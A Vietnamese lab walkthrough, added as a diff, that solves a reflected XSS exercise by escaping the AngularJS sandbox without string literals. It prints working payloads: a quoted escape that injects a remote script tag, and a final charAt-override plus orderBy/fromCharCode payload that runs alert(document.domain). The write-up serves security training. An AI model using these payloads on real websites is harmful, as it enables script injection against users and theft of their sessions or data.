@@ -1,0 +1,36 @@
+XSS - Reflected XSS with AngularJS sandbox escape without strings
+
+End Goal: To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.
+
+Analystic
+--------- 
+Bước 1: Có 1 hộp tìm kiếm --> thử nhập từ khóa tìm kiếm là test
+--> Ta sẽ thấy từ khóa tìm kiếm của ta được phản ánh lên trang web 
+Bước 2: 
+Vào xem mã nguồn của trang web, ta hấy được 1 số thông tin như phiên bản AngularJS đang dùng và đầu vào của ta được đặt vào 1 thẻ h1 để hiển thị dưới dạng mẫu: {{value}}
+<h1 ng-controller=vulnCtrl>1 search results for \{\{value\}\}</h1>
+Hãy thử sử dụng lệnh bỏ qua sandbox AngularJS trong PayloadAllTheThings và sửa đổi đi:
+{{
+    a=toString().constructor.prototype;a.charAt=a.trim;
+    $eval('a,eval(`var _=document.createElement(\'script\');
+    _.src=\'//localhost/m\';document.body.appendChild(_);`),a')
+}}
+Tuy nhiên nó không có tác dụng. Trong phần nền của phòng thí nghiệm có ghi:
+Phòng thí nghiệm này sử dụng AngularJS theo một cách khác thường khi $evalhàm này không khả dụng và bạn sẽ không thể sử dụng bất kỳ chuỗi nào trong AngularJS.
+Để giải quyết vấn đề đó, chúng ta có thể sử dụng toString()để tạo chuỗi mà không cần sử dụng dấu ngoặc kép:
+1&toString()
+Điều này sẽ nhận được String nguyên mẫu, --> kết quả trả về là 5 search results for [object Object]
+Sau đó, chúng ta có thể sử dụng lệnh thoát phổ biến nhất là sử dụng charAt()hàm đã sửa đổi toàn cục trong một biểu thức:
+1&toString().constructor.prototype.charAt=[].join;
+Thao tác này sẽ ghi đè hàm charAtcho mọi chuỗi , do đó bỏ qua hộp cát AngularJS --> kết quả web trả về:
+5 search results for
+Sau đó, chúng ta có thể sử dụng orderBybộ lọc để thực thi tải trọng JavaScript của mình:
+1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:
+Ở đây, chúng ta gửi mảng [1]đến orderBybộ lọc bên phải. Dấu hai chấm biểu thị đối số để gửi đến bộ lọc.
+
+Lý lẽ:
+toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)=1
+Một lần nữa, sử dụng toString()để lấy Stringnguyên mẫu. Sau đó, chúng ta sử dụng fromCharCodephương pháp tạo tải trọng của mình bằng cách chuyển đổi mã ký tự thành chuỗi x=alert(document.domain). Vì charAthàm đã bị ghi đè, AngularJS sẽ cho phép mã này ở nơi mà thông thường nó không cho phép.
+1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)=1
+
+
